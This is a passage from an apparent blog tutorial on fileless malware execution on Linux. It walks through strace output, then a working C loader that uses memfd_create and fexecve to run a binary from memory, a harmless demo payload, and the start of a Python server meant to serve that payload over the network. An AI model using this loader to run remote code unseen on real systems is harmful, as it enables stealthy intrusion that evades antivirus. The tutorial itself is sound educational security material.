</span></span><span class="line"><span class="cl">pread64<span class="o">(</span>3, <span class="s2">&#34;\4\0\0\0\24\0\0\0\3\0\0\0GNU\0\t\233\222%\274\260\320\31\331\326\10\204\276X&gt;\263&#34;</span>..., 68, 880<span class="o">)</span> <span class="o">=</span> <span class="m">68</span>
</span></span><span class="line"><span class="cl">mmap<span class="o">(</span>NULL, 2036952, PROT_READ, MAP_PRIVATE<span class="p">|</span>MAP_DENYWRITE, 3, 0<span class="o">)</span> <span class="o">=</span> 0x7ff99a44c000
</span></span><span class="line"><span class="cl">mprotect<span class="o">(</span>0x7ff99a471000, 1847296, PROT_NONE<span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">mmap<span class="o">(</span>0x7ff99a471000, 1540096, PROT_READ<span class="p">|</span>PROT_EXEC, MAP_PRIVATE<span class="p">|</span>MAP_FIXED<span class="p">|</span>MAP_DENYWRITE, 3, 0x25000<span class="o">)</span> <span class="o">=</span> 0x7ff99a471000
</span></span><span class="line"><span class="cl">mmap<span class="o">(</span>0x7ff99a5e9000, 303104, PROT_READ, MAP_PRIVATE<span class="p">|</span>MAP_FIXED<span class="p">|</span>MAP_DENYWRITE, 3, 0x19d000<span class="o">)</span> <span class="o">=</span> 0x7ff99a5e9000
</span></span><span class="line"><span class="cl">mmap<span class="o">(</span>0x7ff99a634000, 24576, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_FIXED<span class="p">|</span>MAP_DENYWRITE, 3, 0x1e7000<span class="o">)</span> <span class="o">=</span> 0x7ff99a634000
</span></span><span class="line"><span class="cl">mmap<span class="o">(</span>0x7ff99a63a000, 13528, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_FIXED<span class="p">|</span>MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0x7ff99a63a000
</span></span><span class="line"><span class="cl">close<span class="o">(</span>3<span class="o">)</span>                                <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">arch_prctl<span class="o">(</span>ARCH_SET_FS, 0x7ff99a63f540<span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">mprotect<span class="o">(</span>0x7ff99a634000, 12288, PROT_READ<span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">mprotect<span class="o">(</span>0x5593bdded000, 4096, PROT_READ<span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">mprotect<span class="o">(</span>0x7ff99a675000, 4096, PROT_READ<span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">munmap<span class="o">(</span>0x7ff99a640000, 28934<span class="o">)</span>           <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">fstat<span class="o">(</span>1, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0644, <span class="nv">st_size</span><span class="o">=</span>0, ...<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">brk<span class="o">(</span>NULL<span class="o">)</span>                               <span class="o">=</span> 0x5593be003000
</span></span><span class="line"><span class="cl">brk<span class="o">(</span>0x5593be024000<span class="o">)</span>                     <span class="o">=</span> 0x5593be024000
</span></span><span class="line"><span class="cl">write<span class="o">(</span>1, <span class="s2">&#34;Argument count :  4\nArguments li&#34;</span>..., 3244<span class="o">)</span> <span class="o">=</span> <span class="m">3244</span>
</span></span><span class="line"><span class="cl">exit_group<span class="o">(</span>0<span class="o">)</span>                           <span class="o">=</span> ?
</span></span><span class="line"><span class="cl">+++ exited with <span class="m">0</span> +++
</span></span></code></pre></div><p>At first it looks confusing and very difficult to understand, but is very simple and straight forward once you have understood the format of this output.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Format of the strace output.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">syscall(arg1, arg2, arg3, ... )  = Return value
</span></span></code></pre></div><p>Now if we look at line-1 of the <code>strace_output.log</code> file, with the newly gained insight. It is very clear that we are calling <code>execve</code> syscall and passing arguments to it.</p>
<p>According to <a href="https://www.man7.org/linux/man-pages/man2/execve.2.html"><code>man 2 execve</code></a> &ndash;&gt; <em><strong>execve()</strong> executes the program referred to by pathname. This causes the program that is currently being run by the calling process to be replaced with a new program, with newly initialized stack, heap, and (initialized and uninitialized) data segments.</em></p>
<p>This concludes that the execve() syscall is actually responsible to load the executable ELF file into memory!!
Interestingly, our binary reads (gathers) all the data to be printed from multiple locations and then print it at once at end with a single <code>write()</code> syscall. The return value for write() denotes the number of bytes the syscall wrote. This is the exact amount of chars that was supposed to be written out on stdout but we redirected it to a file. Now we can check if the byte counts are same or not.</p>
<p>We can check if the byte counts in the file match the byte count returned by write() syscall, using &ndash;&gt; <code>wc -c program_output.log</code></p>
<p>output:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">3244 program_output.log
</span></span></code></pre></div><p>With this, we know how a normal program executes in Memory. Below diagram summarizes it for a quick recap.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">      <span class="n">C</span> <span class="n">program</span>
</span></span><span class="line"><span class="cl">         <span class="err">│</span>
</span></span><span class="line"><span class="cl">         <span class="err">│</span>
</span></span><span class="line"><span class="cl">         <span class="err">│</span>  <span class="n">Compiles</span>
</span></span><span class="line"><span class="cl">         <span class="err">│</span>
</span></span><span class="line"><span class="cl">         <span class="err">▼</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">     <span class="n">ELF</span> <span class="n">binary</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">         <span class="err">│</span>
</span></span><span class="line"><span class="cl">         <span class="err">│</span>
</span></span><span class="line"><span class="cl">         <span class="err">│</span>  <span class="n">execve</span>
</span></span><span class="line"><span class="cl">         <span class="err">│</span>
</span></span><span class="line"><span class="cl">         <span class="err">▼</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="n">loaded</span> <span class="ow">in</span> <span class="n">memory</span>
</span></span></code></pre></div><h3 id="idea-of-file-less">Idea of file-less?</h3>
<p>In usual scenarios, we have a compiled malicious binary stored on the victim&rsquo;s machine, that&rsquo;s then executed somehow for the malicious purpose of the attacker. Here we have multiple simpler methods and tools to analyze the binary and know what it is going to do. Most of the times, our antivirus can scan system&rsquo;s harddisk and know if there is a malware or a not.</p>
<p>And we all trust our anti-virus for that!! 😜</p>
<p><img loading="lazy" src="https://media.giphy.com/media/scujCg6C3AaFq/giphy.gif" alt=""  />
</p>
<p>But what if an attacker somehow loaded the ELF file directly into the memory, without writing it to harddisk (not even a temp file). In linux, one of the way to do that is via <a href="https://man7.org/linux/man-pages/man2/memfd_create.2.html"><code>memfd_create()</code></a> syscall. This creates an &ldquo;<code>anonymous file</code>&rdquo; and returns a &ldquo;<code>file descriptor</code>&rdquo; to it.</p>
<p>OK! This had me with the first line of the man page - <code>man 2 memfd_create</code>. But there is more to it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">memfd_create() creates an anonymous file and returns a file
</span></span><span class="line"><span class="cl">descriptor that refers to it.  The file behaves like a regular
</span></span><span class="line"><span class="cl">file, and so can be modified, truncated, memory-mapped, and so
</span></span><span class="line"><span class="cl">on.  However, unlike a regular file, it lives in RAM and has a
</span></span><span class="line"><span class="cl">volatile backing storage.  Once all references to the file are
</span></span><span class="line"><span class="cl">dropped, it is automatically released.  Anonymous memory is used
</span></span><span class="line"><span class="cl">for all backing pages of the file.  Therefore, files created by
</span></span><span class="line"><span class="cl">memfd_create() have the same semantics as other anonymous memory
</span></span><span class="line"><span class="cl">allocations such as those allocated using mmap(2) with the
</span></span><span class="line"><span class="cl">MAP_ANONYMOUS flag.
</span></span></code></pre></div><p>We can now create a file directly in RAM all we need is a way to execute it. We could have used same old execve for this but we don&rsquo;t have a file pathname to begin with. After looking through the variants of the exec family syscalls, I stumbled upon <code>fexecve()</code> -  execute program specified via file descriptor.</p>
<p>Now we have both,  a way to <code>create in memory files by memfd_create()</code> and <code>execute it with fexecve()</code>. We just need a program to glue everything together with a neat logic to make things work the way you want it.</p>
<h3 id="first-fileless-program-in-c">First fileless program in C</h3>
<p>I&rsquo;ve written a simple C program (<code>loader.c</code>) that creates an in-memory file and copies the data of a (local) binary to it. And then executes it. Simple, isn&rsquo;t it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE         </span><span class="cm">/* See feature_test_macros(7) */</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#define BUFF_SIZE 1024
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">memfd_create</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Prints usage of the program - takes program name as argument - argv[0]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">usage</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">prog</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span><span class="n">use</span> <span class="o">=</span> <span class="s">&#34;USAGE: %1$s /path/to/binary arg_to_binary1 arg_to_binary2 ...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="n">use</span><span class="p">,</span> <span class="n">prog</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Prints error message and the error number message; exits with errno.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">die</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">msg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ - ] %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">msg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ ? ] %s&#34;</span><span class="p">,</span> <span class="nf">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="nf">exit</span><span class="p">(</span><span class="n">errno</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[])</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">fd1</span><span class="p">,</span> <span class="n">fd2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="n">BUFF_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span> <span class="c1">// Creates a buffer with all values as 0;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>            <span class="c1">// Checks if any argument is passed or not.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nf">usage</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// Create mem file (fd1)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ * ] Trying to create a mem file...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">fd1</span> <span class="o">=</span> <span class="nf">memfd_create</span><span class="p">(</span><span class="s">&#34;testfd&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">fd1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="nf">die</span><span class="p">(</span><span class="s">&#34;Can&#39;t create memfd file&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ + ] Created mem file and attached to fd = %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">fd1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// Read a local binary (fd2) and write to mem file (fd1)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ * ] Reading %s file</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">((</span><span class="n">fd2</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>       <span class="nf">die</span><span class="p">(</span><span class="s">&#34;Can&#39;t open file&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s"> ----------------------------------- </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">read_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">write_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">while</span><span class="p">(</span> <span class="p">(</span><span class="n">read_count</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="n">BUFF_SIZE</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="n">write_count</span> <span class="o">=</span> <span class="nf">write</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="n">read_count</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="nf">die</span><span class="p">(</span><span class="s">&#34;Failed to write to mem file&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="n">i</span> <span class="o">+=</span> <span class="n">read_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">j</span> <span class="o">+=</span> <span class="n">write_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\r</span><span class="s">Read count = %6d  |  Write count = %3d&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s"> ----------------------------------- </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ + ] Starting execution...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// Change argv params; removes the argv[0]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// printf(&#34;%s %s %s %s\n&#34;, argv[0], argv[1], argv[2], argv[3]);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">argc</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>  <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// printf(&#34;%s %s %s %s\n&#34;, argv[0], argv[1], argv[2], argv[3]);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="c1">// Execute fd1 - with new argv and same envp
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">fexecve</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// If fexecve returns, then it is failed.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed Executing....</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">errno</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>We should give some time to understand this code on <strong>why</strong> and <strong>how</strong> it&rsquo;ll load <strong>what</strong> in memory.</p>
<p>We can compile this code to generate an ELF file with <code>gcc loader.c -o loader.o</code>; Once compiled, we can run it with <code>./loader.o</code></p>
<p>Since there are no arguments(<code>argc&lt;2</code>), it should fail with usage information on stdout.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">USAGE</span><span class="p">:</span> <span class="o">./</span><span class="n">loader</span><span class="o">.</span><span class="n">o</span> <span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="n">to</span><span class="o">/</span><span class="n">binary</span> <span class="n">arg_to_binary1</span> <span class="n">arg_to_binary2</span> <span class="o">...</span>
</span></span></code></pre></div><p>Let&rsquo;s try again with some arguments this time.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">./</span><span class="n">loader</span><span class="o">.</span><span class="n">o</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">file</span> <span class="n">loader</span><span class="o">.</span><span class="n">o</span>
</span></span></code></pre></div><p>This time things will not be same as last time. It&rsquo;ll :-</p>
<ol>
<li>Creates an in-memory file and gets a file descriptor back (<code>fd1</code>).</li>
<li>Opens local binary file (argv[1] = <code>/usr/bin/file</code>); Stores this file descriptor in <code>fd2</code>.</li>
<li>Read-write loop until everything from <code>fd2</code> is written in <code>fd1</code>.</li>
<li>Change argv to be passed to in-mem file. The new argv value should look like &ndash;&gt; <code>/usr/bin/file arg1 arg2 arg3</code>. This means we just have to remove the argv[0] and set everything remaining in proper index values.</li>
<li>Execute <code>fd1</code> &ndash;&gt; in-memory file.</li>
</ol>
<p>Output:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">[</span> <span class="o">*</span> <span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">create</span> <span class="n">a</span> <span class="n">mem</span> <span class="n">file</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="o">+</span> <span class="p">]</span> <span class="n">Created</span> <span class="n">mem</span> <span class="n">file</span> <span class="ow">and</span> <span class="n">attached</span> <span class="n">to</span> <span class="n">fd</span> <span class="o">=</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="o">*</span> <span class="p">]</span> <span class="n">Reading</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">file</span> <span class="n">file</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="o">-----------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="n">Read</span> <span class="n">count</span> <span class="o">=</span>  <span class="mi">27104</span>  <span class="o">|</span>  <span class="n">Write</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">27104</span>
</span></span><span class="line"><span class="cl"> <span class="o">-----------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="o">+</span> <span class="p">]</span> <span class="n">Starting</span> <span class="n">execution</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">loader</span><span class="o">.</span><span class="n">o</span><span class="p">:</span> <span class="n">ELF</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">LSB</span> <span class="n">shared</span> <span class="n">object</span><span class="p">,</span> <span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="n">SYSV</span><span class="p">),</span> <span class="n">dynamically</span> <span class="n">linked</span><span class="p">,</span> <span class="n">interpreter</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span><span class="p">,</span> <span class="n">BuildID</span><span class="p">[</span><span class="n">sha1</span><span class="p">]</span><span class="o">=</span><span class="mi">426</span><span class="n">a7743592788cd18c92a76f22ccfb632700d7b</span><span class="p">,</span> <span class="k">for</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">3.2</span><span class="o">.</span><span class="mi">0</span><span class="p">,</span> <span class="n">with</span> <span class="n">debug_info</span><span class="p">,</span> <span class="ow">not</span> <span class="n">stripped</span>
</span></span></code></pre></div><p>Last line of the output is the proof that our in-memory file executed successfully&hellip; Now we can take it to next level.</p>
<h3 id="loading-binary-from-network">loading binary from network</h3>
<p>Till this point, we know how to write a basic code to load a local binary, create a in-mem file for it and then execute it.</p>
<p>But an attacker won&rsquo;t just use it run the local binaries which can be executed directly, instead he would like to execute a binary sitting on his server and load that into victim&rsquo;s system directly in memory. This will not be detected with the help of any disk analysis tool or commands like <code>ls</code>. Also, this will be executing safe from &ldquo;Anti-Virus&rdquo; software complete disk-scan features.
In theory, attacker could run anything from his system on victim&rsquo;s system without leaving any trace on harddisk.</p>
<p>To simulate this, I&rsquo;ve created a pre-setup with <strong>a server that hosts a malicious binary</strong> and victim&rsquo;s system where we have the <code>loader.o</code> present.</p>
<p>Without further ado, let&rsquo;s get things prepared for out test. We need 3 things:</p>
<ol>
<li>loader binary (on victim&rsquo;s machine)</li>
<li>malicious binary (on attacker&rsquo;s machine)</li>
<li>tcp socket server to host malicious binary (on attacker&rsquo;s machine)</li>
</ol>
<p>I started out with a (not so) malicious binary, which simply creates a plain-text file when executed.</p>
<p>Source Code: <code>malicious_program.c</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">data</span> <span class="o">=</span> <span class="s">&#34;This malicious program wishes you to have a good day!!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">FILE</span><span class="o">*</span> <span class="n">fPtr</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;NOTICE_for_U.txt&#34;</span><span class="p">,</span> <span class="s">&#34;w&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">fPtr</span><span class="p">)</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fputs</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">fPtr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">fPtr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Compile it -&gt; <code>gcc malicious_program.c -o malicious_program.o</code></p>
<p>Next, I wrote a small python tcp socket server that will host the <code>malicious_program.o</code> binary.</p>
<p>Source Code: <code>python_server.py</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Read binary</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;malicious_program.o&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Host it on 192.168.56.56:1234</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s1">&#39;192.168.56.56&#39;</span><span class="p">,</span> <span class="mi">1234</span><span class="p">))</span>
